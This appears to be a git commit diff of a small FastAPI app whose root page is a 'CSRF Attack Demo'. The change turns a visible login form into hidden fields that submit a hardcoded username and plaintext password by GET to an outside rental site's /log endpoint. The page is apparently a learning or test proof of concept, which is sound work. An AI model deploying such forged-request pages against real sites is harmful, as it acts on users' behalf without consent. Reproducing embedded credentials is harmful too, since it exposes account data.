e7a85a0bbd79d13d560361a43da1883f2624934c
Orkennn <sabit_orken@mail.ru>
2024-10-08 00:25:27 +0500

    6

--- main.py
+++ main.py
@@ -11,25 +11,20 @@ async def favicon():
 @app.get("/", response_class=HTMLResponse)
 async def read_root():
     return """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Attack Demo</title>
-</head>
-<body>
-    <h1>CSRF Attack Demo</h1>
-    <form action="https://sktst-rental.onrender.com/log" method="POST">
-        <label for="username">Username or Email:</label>
-        <input type="text" id="username" name="username" value="Orkennnnnnn">
-        <br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" value="12qwaszx">
-        <br>
-        <input type="submit" value="login">
-    </form>
-</body>
-</html>
-
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>CSRF Attack Demo</title>
+    </head>
+    <body>
+        <h1>CSRF Attack Demo</h1>
+        <form action="https://sktst-rental.onrender.com/log" method="GET">
+            <input type="hidden" name="username" value="Orkennnnnnn">
+            <input type="hidden" name="password" value="12qwaszx">
+            <input type="submit" value="login">
+        </form>
+    </body>
+    </html>
     """
